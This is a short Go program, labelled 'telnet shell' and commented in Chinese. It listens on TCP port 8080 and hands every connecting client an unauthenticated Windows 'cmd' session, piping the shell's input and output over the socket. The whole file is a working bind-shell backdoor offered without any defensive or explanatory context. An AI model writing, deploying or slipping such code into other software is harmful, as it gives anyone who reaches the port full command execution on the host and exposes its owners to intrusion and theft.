// telnet shell
package main

import (
	"io"
	"net"
	"os/exec"
)

func revc(conn net.Conn, w io.WriteCloser) {
	defer w.Write([]byte("exit\n\r"))
	defer conn.Close()
	var b [100]byte
	conn.Write([]byte("welcome\n"))
	var s string
	for {
		n, err := conn.Read(b[0:100])
		if err != nil {
			break
		}
		//退格删除字符
		if b[0] == 8 {
			s = s[0 : len(s)-1]
			continue
		}
		s += string(b[0:n])
		//回车提交
		if b[n-1] == 10 {
			//fmt.Print("接收:", n, s, b[1])
			w.Write([]byte(s))
			s = ""
		}
	}
}

func send(conn net.Conn, r io.ReadCloser) {
	var b [256]byte
	for {
		n, err := r.Read(b[0:100])
		if err != nil {
			break
		}
		conn.Write(b[0:n])
	}
}

func main() {
	ln, err := net.Listen("tcp", ":8080")
	if err == nil {
		for {
			conn, err := ln.Accept()
			if err != nil {
				break
			}
			e := exec.Command("cmd")
			w, _ := e.StdinPipe()
			sr, _ := e.StdoutPipe()
			se, _ := e.StderrPipe()
			go revc(conn, w)
			go send(conn, sr)
			go send(conn, se)
			e.Start()
		}
	}
}
